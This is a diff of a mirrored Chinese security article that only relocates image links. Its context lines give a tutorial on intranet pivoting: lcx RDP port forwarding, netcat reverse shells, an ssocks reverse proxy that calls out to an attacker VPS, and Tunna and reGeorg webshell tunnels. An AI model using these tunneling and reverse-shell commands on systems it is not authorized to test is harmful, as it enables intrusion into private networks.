@@ -25,7 +25,7 @@
 
 <!--more-->
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807285923194128.jpg" alt="p1" /></p>
+<p><img src="../image/drops/20160418/2016041807285923194128.jpg" alt="p1" /></p>
 
 <p>然后在公网的机器上：</p>
 
@@ -33,11 +33,11 @@
 
 <p>例如：<code>Lcx.exe –listen 51 3389</code></p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807290137393219.jpg" alt="p2" /></p>
+<p><img src="../image/drops/20160418/2016041807290137393219.jpg" alt="p2" /></p>
 
 <p>这个时候已经将内网的3389转发到了公网机器的3389端口，我们在本地机器上远程公网IP+3389 ，就连接上了内网机器的3389</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807290353605315.jpg" alt="p3" /></p>
+<p><img src="../image/drops/20160418/2016041807290353605315.jpg" alt="p3" /></p>
 
 <h1>0x01 NC 反弹CMDshell</h1>
 
@@ -49,29 +49,29 @@
 
 <p>在远程机器上(t参数可以省略)</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/201604180729048604348.jpg" alt="p4" /></p>
+<p><img src="../image/drops/20160418/201604180729048604348.jpg" alt="p4" /></p>
 
 <p>在本地机器上</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/201604180729063464459.jpg" alt="p5" /></p>
+<p><img src="../image/drops/20160418/201604180729063464459.jpg" alt="p5" /></p>
 
 <p>成功之后，本地机器就获得了一个远程机器的shell</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807290748672610.jpg" alt="p6" /></p>
+<p><img src="../image/drops/20160418/2016041807290748672610.jpg" alt="p6" /></p>
 
 <p><strong>反向连接：</strong></p>
 
 <p>在本机运行上</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807290974938710.jpg" alt="p7" /></p>
+<p><img src="../image/drops/20160418/2016041807290974938710.jpg" alt="p7" /></p>
 
 <p>在远程机器上(t参数可以省略)</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/201604180729102005488.jpg" alt="p8" /></p>
+<p><img src="../image/drops/20160418/201604180729102005488.jpg" alt="p8" /></p>
 
 <p>然后成功之后，我们在本地机器上看一下，已经获得了远程机器的cmdshell</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/201604180729124759897.jpg" alt="p9" /></p>
+<p><img src="../image/drops/20160418/201604180729124759897.jpg" alt="p9" /></p>
 
 <p>这里还有前人总结的十种反弹shell的方法，很不错</p>
 
@@ -88,31 +88,31 @@
 
 <p>下载地址：<a href="https://sourceforge.net/projects/ssocks/">https://sourceforge.net/projects/ssocks/</a></p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807291374299107.jpg" alt="p10" /></p>
+<p><img src="../image/drops/20160418/2016041807291374299107.jpg" alt="p10" /></p>
 
 <p>先在vps 执行<code>rcsocket.exe –l 1088 –p 8888 –vv</code>, 监听1088端口</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/20160418072915382371112.jpg" alt="p11" /></p>
+<p><img src="../image/drops/20160418/20160418072915382371112.jpg" alt="p11" /></p>
 
 <p>内网机器执行<code>./rssocks –vv –s 192.168.30.103:8888</code>(VPS)</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807291661376129.jpg" alt="p12" /></p>
+<p><img src="../image/drops/20160418/2016041807291661376129.jpg" alt="p12" /></p>
 
 <p>成功，则会看到会话建立</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807291847192136.jpg" alt="p13" /></p>
+<p><img src="../image/drops/20160418/2016041807291847192136.jpg" alt="p13" /></p>
 
 <p>设置代理，让本机可以通过VPS的1088端口访问内网机器。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807291992761146.jpg" alt="14" /></p>
+<p><img src="../image/drops/20160418/2016041807291992761146.jpg" alt="14" /></p>
 
 <p>本机上 ssh 192.168.43.136内网主机</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807292129216156.jpg" alt="p15" /></p>
+<p><img src="../image/drops/20160418/2016041807292129216156.jpg" alt="p15" /></p>
 
 <p>成功ssh到内网机器</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807292278721165.jpg" alt="p16" /></p>
+<p><img src="../image/drops/20160418/2016041807292278721165.jpg" alt="p16" /></p>
 
 <h1>0x03 Tunna 正向代理</h1>
 
@@ -122,14 +122,14 @@
 
 <p><code>proxy.py -u http://xxx.com:206/test /conn.jsp -l 8888 -r 22 -v -s</code></p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807292494149177.jpg" alt="p17" /></p>
+<p><img src="../image/drops/20160418/2016041807292494149177.jpg" alt="p17" /></p>
 
 <p>然后在xshell中执行<br />
 ssh 127.0.0.1 8888,看到下面的样子，说明已经成功了</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807292527712186.jpg" alt="p18" /></p>
+<p><img src="../image/drops/20160418/2016041807292527712186.jpg" alt="p18" /></p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807292663007195.jpg" alt="p19" /></p>
+<p><img src="../image/drops/20160418/2016041807292663007195.jpg" alt="p19" /></p>
 
 <p>同样的，如果内网的机器是windows，就把3389转出来</p>
 
@@ -156,25 +156,25 @@ ssh 127.0.0.1 8888,看到下面的样子，说明已经成功了</p>
 
 <p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, 'All seems fine'”，表示脚本运行正常</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807292823881205.jpg" alt="p20" /></p>
+<p><img src="../image/drops/20160418/2016041807292823881205.jpg" alt="p20" /></p>
 
 <p>运行<code>python reGeorgSocksProxy.py -p 8888 -u http://www.xxx.com/tunnel.php</code></p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/20160418072930371702110.jpg" alt="p21" /></p>
+<p><img src="../image/drops/20160418/20160418072930371702110.jpg" alt="p21" /></p>
 
 <p>将proxifier打开，在Proxy Server中这样配置</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807293185305225.jpg" alt="p22" /></p>
+<p><img src="../image/drops/20160418/2016041807293185305225.jpg" alt="p22" /></p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807293316940234.jpg" alt="p23" /></p>
+<p><img src="../image/drops/20160418/2016041807293316940234.jpg" alt="p23" /></p>
 
 <p>然后就可以在本地访问内网的机器了</p>
 
-<p><img src="http://static.wooyun.org//drops/20160429/2016042903552840012.png" alt="p24" /></p>
+<p><img src="../image/drops/20160429/2016042903552840012.png" alt="p24" /></p>
 
 <p>成功3389到内网机器</p>
 
-<p><img src="http://static.wooyun.org//drops/20160418/2016041807293637385254.jpg" alt="p25" /></p>      </p>
+<p><img src="../image/drops/20160418/2016041807293637385254.jpg" alt="p25" /></p>      </p>
     
 			</body>
 		</html>
